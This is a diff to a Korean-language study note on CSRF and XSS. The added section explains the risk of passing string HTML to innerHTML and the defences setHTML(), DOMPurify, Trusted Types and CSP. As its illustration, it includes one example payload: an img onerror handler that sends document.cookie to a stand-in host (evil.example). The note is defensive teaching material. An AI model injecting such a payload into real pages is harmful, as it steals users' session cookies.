@@ -1,11 +1,14 @@
 ---
 title: "웹 보안: CSRF와 XSS"
 concept: "CSRF"
-summary: "사용자의 권한을 도용하는 CSRF와 악성 스크립트를 주입하는 XSS의 원리와 방어법."
+summary: "사용자의 권한을 도용하는 CSRF와 악성 스크립트를 주입하는 XSS의 원리와 방어법. 문자열 HTML을 innerHTML에 넣을 때의 위험과 setHTML·DOMPurify·Trusted Types도 다룬다."
 tags: ["security", "web", "http", "django"]
-source: til
-date: "2026-10-13"
+source: mixed
+date: "2026-10-15"
+sources: ["https://wesbos.com/javascript/04-the-dom/html-from-strings-and-xss", "https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML", "https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API"]
 ---
+
+> TIL을 정리하고, 문자열 HTML과 XSS 부분은 Wes Bos의 「Beginner JavaScript」 강의 노트(wesbos.com/javascript)를 함께 참고했다.
 
 웹 애플리케이션의 대표적인 취약점 두 가지는 **CSRF**와 **XSS**다. 둘 다 "브라우저가 사용자를 대신해 무언가를 실행한다"는 점을 악용하지만, CSRF는 **요청을 위조**하고 XSS는 **스크립트를 주입**한다는 점이 다르다.
 
@@ -33,13 +36,29 @@ Django는 `CsrfViewMiddleware`와 폼에 숨은 입력을 넣는 `{% csrf_token 
 
 공격자가 입력창(`<input>`, 게시글 등)을 통해 웹 페이지에 **악성 스크립트를 삽입**하는 공격이다. 다른 사용자의 브라우저가 그 스크립트를 실행하면서 쿠키 탈취, 사용자 사칭, 접근 제어 우회 등이 일어난다.
 
+### 문자열로 HTML을 만들 때
+
+템플릿 리터럴로 HTML을 만들어 `innerHTML`에 넣는 코드는 짧고 편하다. 하지만 끼워 넣은 값이 사용자 입력이면 그 값도 HTML로 해석된다.
+
+```javascript
+const desc = '귀여운 강아지 <img src="x" onerror="fetch(`//evil.example?c=${document.cookie}`)">'
+card.innerHTML = `<h2>${desc}</h2>` // onerror가 실행된다
+```
+
+- `innerHTML`로 넣은 `<script>` 태그는 실행되지 않는다. 그래서 안전하다고 착각하기 쉽지만, `onerror`·`onload` 같은 **이벤트 속성**과 `javascript:` URL은 그대로 동작한다. `<style>`만 넣어도 페이지 전체를 숨기거나 가짜 화면을 덮을 수 있다.
+- 같은 위험을 가진 지점(sink)은 `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `createContextualFragment`, `document.write`, 그리고 React의 `dangerouslySetInnerHTML`이다.
+- 텍스트만 필요하면 `textContent`나 `createElement` + `textContent`로 만든다([[dom-manipulation|DOM 조작과 이벤트]]).
+- HTML을 허용해야 하면 정제(sanitize)한다. 표준 **`Element.setHTML()`**(HTML Sanitizer API)은 문자열을 파싱하면서 스크립트·이벤트 속성 같은 위험 요소를 항상 제거한다. 크롬 146·파이어폭스 148부터 지원하고 2026년 10월 기준 사파리는 지원하지 않으므로, 기능 감지 후 없으면 **DOMPurify**로 정제해 넣는다. 이름이 비슷한 `setHTMLUnsafe()`는 정제하지 않는다.
+- **Trusted Types**(CSP의 `require-trusted-types-for 'script'`)를 켜면 위 sink에 일반 문자열을 넣는 코드가 아예 오류가 된다. 크롬 83, 사파리 26, 파이어폭스 148부터 지원해 주요 브라우저에서 모두 쓸 수 있다.
+
 ### 방어
 
-- 사용자 입력을 HTML로 그대로 삽입하지 않는다. JavaScript에서는 `innerHTML` 대신 `textContent`/`innerText`를 쓴다([DOM 조작](/knowledge/dictionary/frontend/javascript/dom-manipulation) 참고).
+- 사용자 입력을 HTML로 그대로 삽입하지 않는다. JavaScript에서는 `innerHTML` 대신 `textContent`를 쓴다.
 - 출력 시 HTML 이스케이프 처리를 한다. React·Django 템플릿은 기본적으로 이스케이프한다(React의 `dangerouslySetInnerHTML`은 예외이므로 주의).
 - 세션 쿠키에 `HttpOnly` 속성을 주어 스크립트에서 읽지 못하게 한다.
 - **CSP(Content Security Policy)** 헤더로 실행할 수 있는 스크립트의 출처를 제한한다. 인라인 스크립트를 막고 nonce·hash가 맞는 스크립트만 허용하면, 주입된 스크립트가 있어도 실행되지 않는다.
-- 사용자가 쓴 HTML(리치 텍스트)을 보여 줘야 하면 DOMPurify 같은 정제 라이브러리를 거친다.
+- 사용자가 쓴 HTML(리치 텍스트)을 보여 줘야 하면 `setHTML()`이나 DOMPurify로 정제한다.
+- `localStorage`도 같은 출처의 스크립트가 모두 읽으므로, XSS가 나면 그 안의 토큰이 함께 새어 나간다([[web-storage|Web Storage]]).
 
 ## 비교
 
